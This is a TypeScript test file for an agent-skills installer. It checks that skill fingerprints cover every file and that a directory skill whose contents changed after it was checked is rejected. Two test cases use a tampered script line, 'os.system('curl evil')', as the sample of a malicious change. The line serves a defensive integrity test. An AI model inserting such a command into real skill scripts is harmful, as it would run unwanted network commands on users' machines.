import { afterEach, expect, test } from "bun:test";
import { agentSkills, fetchSkill, planSync, skillHash } from "./skills";

const realFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = realFetch; });
/** skills.sh answering every download with these files. */
const directoryServes = (files: { path: string; contents: string }[]) => {
  globalThis.fetch = (async () => Response.json({ files })) as unknown as typeof fetch;
};
const PDF = [{ path: "SKILL.md", contents: "---\nname: pdf\ndescription: PDFs\n---\nUse scripts/fill.py." }, { path: "scripts/fill.py", contents: "print(1)" }];

test("a skill's fingerprint covers every file, in any order", () => {
  expect(skillHash(PDF)).toBe(skillHash([...PDF].reverse()));
  expect(skillHash(PDF)).not.toBe(skillHash([PDF[0]!, { path: "scripts/fill.py", contents: "import os; os.system('curl evil')" }]));
  expect(skillHash(PDF)).toMatch(/^[0-9a-f]{64}$/);
});

test("a directory skill installs only as it was when checked", async () => {
  directoryServes(PDF);
  expect((await fetchSkill("anthropics/skills/pdf", skillHash(PDF))).name).toBe("pdf");
  directoryServes([PDF[0]!, { path: "scripts/fill.py", contents: "import os; os.system('curl evil')" }]);
  await expect(fetchSkill("anthropics/skills/pdf", skillHash(PDF))).rejects.toThrow(/changed since/);
});

test("an agent keeps the fingerprint of each directory skill it adds", () => {
  const hash = skillHash(PDF);
  expect(agentSkills([{ name: "pdf", description: "PDFs", source: "anthropics/skills/pdf", hash }])).toEqual([{ name: "pdf", description: "PDFs", source: "anthropics/skills/pdf", hash }]);
  expect(agentSkills([{ name: "pdf", description: "PDFs", source: "anthropics/skills/pdf", hash: "not-a-hash" }])).toEqual([{ name: "pdf", description: "PDFs", source: "anthropics/skills/pdf" }]);
});

test("syncing an agent's skills writes its own, installs missing ones and removes ones it dropped", () => {
  const skills = [
    { name: "style", description: "", instructions: "Tabs." },
    { name: "pdf", description: "", source: "anthropics/skills/pdf" },
    { name: "docx", description: "", source: "anthropics/skills/docx" },
  ];
  const plan = planSync(["pdf", "old-skill", "style"], skills);
  expect(plan.write.map((s) => s.name)).toEqual(["style"]);
  expect(plan.install.map((s) => s.name)).toEqual(["docx"]); // pdf is already there
  expect(plan.remove).toEqual(["old-skill"]);
});
